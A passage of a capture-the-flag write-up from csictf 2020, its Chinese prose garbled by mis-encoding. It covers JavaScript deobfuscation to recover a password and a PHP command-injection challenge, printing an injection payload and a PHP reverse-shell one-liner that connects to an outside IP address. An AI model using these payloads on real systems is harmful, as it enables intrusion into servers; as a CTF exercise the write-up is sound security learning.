<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200726230437.png" alt=""></p>
<h3 id="Mr-Rami">Mr Rami</h3>
<p>è¿™ä¸ªé¢˜æ˜¯çœŸçš„å‘ã€‚ã€‚ã€‚ã€‚çœŸä¼šç©</p>
<p>ç›´æ¥æŸ¥çœ‹robot.txtå°±è¡Œã€‚ã€‚</p>
<h3 id="Secure-Portal">Secure Portal</h3>
<p><strong>è€ƒå¯ŸJSä»£ç æ··æ·†</strong></p>
<p>ä¸€å †è¢«æ··æ·†åçš„JSä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x575c=[<span class="string">&#x27;\x32\x2d\x34&#x27;</span>,<span class="string">&#x27;\x73\x75\x62\x73\x74\x72\x69\x6e\x67&#x27;</span>,<span class="string">&#x27;\x34\x2d\x37&#x27;</span>,<span class="string">&#x27;\x67\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x31\x32\x2d\x31\x34&#x27;</span>,<span class="string">&#x27;\x30\x2d\x32&#x27;</span>,<span class="string">&#x27;\x73\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x39\x2d\x31\x32&#x27;</span>,<span class="string">&#x27;\x5e\x37\x4d&#x27;</span>,<span class="string">&#x27;\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="string">&#x27;\x62\x62\x3d&#x27;</span>,<span class="string">&#x27;\x37\x2d\x39&#x27;</span>,<span class="string">&#x27;\x31\x34\x2d\x31\x36&#x27;</span>,<span class="string">&#x27;\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65&#x27;</span>,];(<span class="function"><span class="keyword">function</span>(<span class="params">_0x4f0aae,_0x575cf8</span>)</span>&#123;<span class="keyword">var</span> _0x51eea2=<span class="function"><span class="keyword">function</span>(<span class="params">_0x180eeb</span>)</span>&#123;<span class="keyword">while</span>(--_0x180eeb)&#123;_0x4f0aae[<span class="string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;_0x51eea2(++_0x575cf8);&#125;(_0x575c,<span class="number">0x78</span>));<span class="keyword">var</span> _0x51ee=<span class="function"><span class="keyword">function</span>(<span class="params">_0x4f0aae,_0x575cf8</span>)</span>&#123;_0x4f0aae=_0x4f0aae<span class="number">-0x0</span>;<span class="keyword">var</span> _0x51eea2=_0x575c[_0x4f0aae];<span class="keyword">return</span> _0x51eea2;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">CheckPassword</span>(<span class="params">_0x47df21</span>)</span>&#123;<span class="keyword">var</span> _0x4bbdc3=[_0x51ee(<span class="string">&#x27;0xe&#x27;</span>),_0x51ee(<span class="string">&#x27;0x3&#x27;</span>),_0x51ee(<span class="string">&#x27;0x7&#x27;</span>),_0x51ee(<span class="string">&#x27;0x4&#x27;</span>),_0x51ee(<span class="string">&#x27;0xa&#x27;</span>)];<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;9-12&#x27;</span>,<span class="string">&#x27;BE*&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x2&#x27;</span>),_0x51ee(<span class="string">&#x27;0xb&#x27;</span>));<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x6&#x27;</span>),<span class="string">&#x27;5W&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;16&#x27;</span>,_0x51ee(<span class="string">&#x27;0x9&#x27;</span>));<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x5&#x27;</span>),<span class="string">&#x27;pg&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](<span class="string">&#x27;7-9&#x27;</span>,<span class="string">&#x27;+n&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0xd&#x27;</span>),<span class="string">&#x27;4t&#x27;</span>);<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x2</span>]](_0x51ee(<span class="string">&#x27;0x0&#x27;</span>),<span class="string">&#x27;$F&#x27;</span>);<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x8&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x9</span>,<span class="number">0xc</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x2&#x27;</span>))===_0x47df21[<span class="string">&#x27;substring&#x27;</span>](<span class="number">0x4</span>,<span class="number">0x7</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x6&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x0</span>,<span class="number">0x2</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](<span class="string">&#x27;16&#x27;</span>)===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x10</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x5&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0xc</span>,<span class="number">0xe</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0xc&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x7</span>,<span class="number">0x9</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0xd&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0xe</span>,<span class="number">0x10</span>))&#123;<span class="keyword">if</span>(<span class="built_in">window</span>[_0x4bbdc3[<span class="number">0x0</span>]][_0x4bbdc3[<span class="number">0x1</span>]](_0x51ee(<span class="string">&#x27;0x0&#x27;</span>))===_0x47df21[_0x51ee(<span class="string">&#x27;0x1&#x27;</span>)](<span class="number">0x2</span>,<span class="number">0x4</span>))<span class="keyword">return</span>!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;<span class="keyword">return</span>![];&#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨åœ¨çº¿å·¥å…·è§£å¯†ä¸€ä¸‹</p>
<blockquote>
<p><a href="http://www.jsnice.org/">http://www.jsnice.org/</a></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="comment">/** <span class="doctag">@type <span class="type">&#123;!Array&#125;</span> </span>*/</span></span><br><span class="line"><span class="keyword">var</span> _0x575c = [<span class="string">&quot;2-4&quot;</span>, <span class="string">&quot;substring&quot;</span>, <span class="string">&quot;4-7&quot;</span>, <span class="string">&quot;getItem&quot;</span>, <span class="string">&quot;deleteItem&quot;</span>, <span class="string">&quot;12-14&quot;</span>, <span class="string">&quot;0-2&quot;</span>, <span class="string">&quot;setItem&quot;</span>, <span class="string">&quot;9-12&quot;</span>, <span class="string">&quot;^7M&quot;</span>, <span class="string">&quot;updateItem&quot;</span>, <span class="string">&quot;bb=&quot;</span>, <span class="string">&quot;7-9&quot;</span>, <span class="string">&quot;14-16&quot;</span>, <span class="string">&quot;localStorage&quot;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">data, i</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">selected_image</span></span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return <span class="type">&#123;undefined&#125;</span></span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">var</span> validateGroupedContexts = <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">selected_image</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; --selected_image;) &#123;</span><br><span class="line">      data[<span class="string">&quot;push&quot;</span>](data[<span class="string">&quot;shift&quot;</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  validateGroupedContexts(++i);</span><br><span class="line">&#125;)(_0x575c, <span class="number">120</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">ballNumber</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;?&#125;</span> <span class="variable">opt_target</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;?&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> _0x51ee = <span class="function"><span class="keyword">function</span> <span class="title">PocketDropEvent</span>(<span class="params">ballNumber, opt_target</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;number&#125;</span> </span>*/</span></span><br><span class="line">  ballNumber = ballNumber - <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> ball = _0x575c[ballNumber];</span><br><span class="line">  <span class="keyword">return</span> ball;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;!Object&#125;</span> <span class="variable">results</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;?&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckPassword</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type <span class="type">&#123;!Array&#125;</span> </span>*/</span></span><br><span class="line">  <span class="keyword">var</span> easing = [_0x51ee(<span class="string">&quot;0xe&quot;</span>), _0x51ee(<span class="string">&quot;0x3&quot;</span>), _0x51ee(<span class="string">&quot;0x7&quot;</span>), _0x51ee(<span class="string">&quot;0x4&quot;</span>), _0x51ee(<span class="string">&quot;0xa&quot;</span>)];</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;9-12&quot;</span>, <span class="string">&quot;BE*&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>), _0x51ee(<span class="string">&quot;0xb&quot;</span>));</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>), <span class="string">&quot;5W&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;16&quot;</span>, _0x51ee(<span class="string">&quot;0x9&quot;</span>));</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>), <span class="string">&quot;pg&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](<span class="string">&quot;7-9&quot;</span>, <span class="string">&quot;+n&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>), <span class="string">&quot;4t&quot;</span>);</span><br><span class="line">  <span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">2</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>), <span class="string">&quot;$F&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x8&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">9</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>)) === results[<span class="string">&quot;substring&quot;</span>](<span class="number">4</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](<span class="string">&quot;16&quot;</span>) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">16</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">12</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xc&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">7</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">14</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">2</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> !![];</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>å…¶å®å¯ä»¥ç›´æ¥çœ‹checkPasswordå‡½æ•°ï¼Œä¸‹é¢è¿™ä¸€å—åº”è¯¥æ˜¯ç»™å…ƒç´ èµ‹å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;));</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;);</span><br><span class="line">window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;));</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;);</span><br><span class="line">window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;);</span><br><span class="line">window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;);</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢è¿™ä¸€å—å°±æ˜¯æ£€æŸ¥å¯†ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x8&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">9</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x2&quot;</span>)) === results[<span class="string">&quot;substring&quot;</span>](<span class="number">4</span>, <span class="number">7</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x6&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">0</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](<span class="string">&quot;16&quot;</span>) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">16</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x5&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">12</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xc&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">7</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0xd&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">14</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">window</span>[easing[<span class="number">0</span>]][easing[<span class="number">1</span>]](_0x51ee(<span class="string">&quot;0x0&quot;</span>)) === results[_0x51ee(<span class="string">&quot;0x1&quot;</span>)](<span class="number">2</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> !![];</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ![];</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°å¯†ç è¢«æ‹†åˆ†æˆå¾ˆå¤šéƒ¨åˆ†ï¼Œè€Œä¸”ä¸æ˜¯æŒ‰0ï¼Œ1ï¼Œ2ï¼Œ3â€¦é¡ºåºæ¥çš„ã€‚<code>_0x51ee</code>æˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå˜é‡ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸¤éƒ¨åˆ†ç»“åˆæ¥çœ‹ï¼Œå‘ç°å…ƒç´ èµ‹å€¼å’Œæ£€æŸ¥å¯†ç çš„é¡ºåºæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´9-12ä½æ˜¯<code>BE*</code>ï¼Œ4-7ä½æ˜¯<code>_0x51ee(&quot;0xb&quot;)</code>ï¼Œå¹¶ä¸”<code>4-7</code>å¯¹åº”<code>_0x51ee(&quot;0x2&quot;)</code>ï¼Œå†å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹<code>_0x575c</code>æ•°ç»„ï¼Œåˆšå¥½<code>_0x575c[0x02]=4-7</code>ã€‚ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°å¯†ç <code>5W$Fbb=+nBE*pg4t^7M</code>ã€‚</p>
<h3 id="Baby-Count">Baby Count</h3>
<p><strong>è€ƒå¯Ÿæ–‡ä»¶åŒ…å«+å‘½ä»¤æ‰§è¡Œ</strong></p>
<p><code>robots.txt</code>æç¤ºæœ‰ä¸€ä¸ª<code>checkpass.php</code>æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨wrapperæ–‡ä»¶åŒ…å«</p>
<p><code>checkpass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">&quot;w0rdc0unt123&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;IMPORTANT!!! The page is still under development. This has a secret, do not push this page.&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>wc.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;wc <span class="keyword">as</span> a service&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;password&#x27;</span>] !== getenv(<span class="string">&#x27;PASSWORD&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;PASSWORD&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry, only people from csivit are allowed to access this page.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Character Count <span class="keyword">as</span> a Service&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;wc.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> rows=<span class="number">30</span> cols=<span class="number">100</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;text&quot;</span>])) &#123;</span><br><span class="line">        $text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Character Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $text . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>æŠŠcookieä¸­çš„passwordæ”¹æˆ<code>w0rdc0unt123</code>ï¼Œå°±å¯ä»¥è¾“å…¥textäº†</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727152049.png" style="zoom:50%;" />
<p>æ¥çœ‹ä¸€ä¸‹åç«¯çš„å¤„ç†é€»è¾‘ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;text&quot;</span>])) &#123;</span><br><span class="line">        $text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Character Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $text . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾<code>$text</code>å‚æ•°æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;; whoami #</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727154945.png" style="zoom:50%;" />
<p>åå¼¹ä¸€ä¸ªshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;; php -r &#39;$sock&#x3D;fsockopen(&quot;47.97.199.89&quot;,11000);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; #</span><br></pre></td></tr></table></figure>
<p>å…¨å±€æŸ¥æ‰¾ä¸€ä¸‹flagæ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727164827.png" alt=""></p>
<p><code>/ctf/system/of/a/down/flag.txt</code>æ˜¾ç¤ºæƒé™ä¸å¤Ÿ</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165244.png" alt=""></p>
<p>READMEé‡Œé¢æœ‰ä¸€æ®µHashåŠ å¯†çš„å€¼ï¼Œé€åˆ°å·¥å…·é‡Œé¢å»è¯†åˆ«æ˜¯MD5åŠ å¯†ï¼Œæ”¾åˆ°ç½‘ä¸Šå»è·‘æ²¡æœ‰æ‹å‡ºæ¥ï¼Œçœ‹å…¶ä»–çš„wpæ˜¯csictf</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165431.png" alt=""></p>
<p>åˆ‡æ¢æˆctfç”¨æˆ·</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200727165639.png" alt=""></p>
<h3 id="The-Confused-Deputy">The Confused Deputy</h3>
<p><strong>è€ƒå¯ŸCSSæ³¨å…¥</strong></p>
<p>è„šæœ¬ç”Ÿæˆpayload</p>
